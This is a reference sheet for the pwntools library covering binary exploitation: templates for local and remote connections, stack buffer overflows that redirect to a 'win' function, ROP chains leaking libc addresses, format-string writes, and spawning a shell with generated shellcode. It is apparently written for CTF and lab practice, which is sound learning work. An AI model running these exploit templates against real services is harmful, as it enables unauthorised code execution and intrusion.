# Skill: pwntools (Binary Exploitation)

## Install
```bash
pip install pwntools
```

## Basic Template
```python
from pwn import *

# Local binary
p = process('./binary')

# Remote
p = remote('10.10.10.1', 1337)

# With GDB
p = gdb.debug('./binary', 'break main')

# ELF info
elf = ELF('./binary')
print(hex(elf.symbols['win']))      # function address
print(hex(elf.got['puts']))         # GOT entry
```

## Buffer Overflow
```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# Find offset
offset = cyclic_find(0x6161616c)    # from segfault value

# Build payload
payload = flat(
    b'A' * offset,
    p64(elf.symbols['win']),        # overwrite return address
)

p.sendline(payload)
p.interactive()
```

## ROP Chain
```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

rop.call('puts', [elf.got['puts']])  # leak libc address
rop.call('main')                     # return to main

payload = flat(b'A' * offset, rop.chain())
```

## Format String
```python
# Leak stack value at position 6
payload = b"%6$p"

# Write value 0xdeadbeef to address 0x601060
payload = fmtstr_payload(offset, {0x601060: 0xdeadbeef})
```

## Utilities
```python
# Pack/unpack
p64(0xdeadbeef)          # little-endian 64-bit
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')

# Context
context.arch = 'amd64'
context.log_level = 'debug'

# Shellcode
shellcode = asm(shellcraft.sh())
```
